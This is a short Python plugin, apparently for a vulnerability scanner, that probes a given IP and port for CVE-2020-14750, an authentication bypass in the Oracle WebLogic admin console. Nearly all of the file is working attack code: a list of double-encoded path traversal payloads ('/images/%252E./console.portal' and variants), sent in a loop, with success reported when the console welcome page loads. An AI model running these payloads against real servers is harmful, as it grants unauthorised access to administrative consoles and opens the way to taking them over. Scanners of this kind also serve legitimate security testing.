from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union
import requests
from utils import http
from stars import Star, target_type
class CVE_2020_14750(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2020-14750',
        'TAG': []
    }
    type = target_type.VULNERABILITY
    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        session = requests.Session()
        paths = [
            '/images/%252E./console.portal',
            '/images/%252e%252e%252fconsole.portal',
            '/css/%252E./console.portal',
            '/css/%252e%252e%252fconsole.portal',
            '/console/images/%252E./console.portal',
            '/console/images/%252e%252e%252fconsole.portal',
            '/console/css/%252E./console.portal',
            '/console/css/%252e%252e%252fconsole.portal', ]
        for path in paths:
            r, data = http(
                'http://{}:{}{}'.format(dip, dport, path), ssl=force_ssl, session=session, timeout=5)
            r, data = http(
                'http://{}:{}{}'.format(dip, dport, path), ssl=force_ssl, session=session, timeout=5)
            if r and 'id="welcome"' in r.text:
                return True, {'url': r.url}
        return False, {}
def run(queue: SyncManager.Queue, data: Dict):
    obj = CVE_2020_14750()
    result = {
        'IP': data['IP'],
        'PORT': data['PORT'],
        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
        'MSG': '',
        'STATE': False
    }
    result['STATE'], result['MSG'] = obj.light_and_msg(
        data['IP'], data['PORT'], data['IS_SSL'])
    queue.put(result)
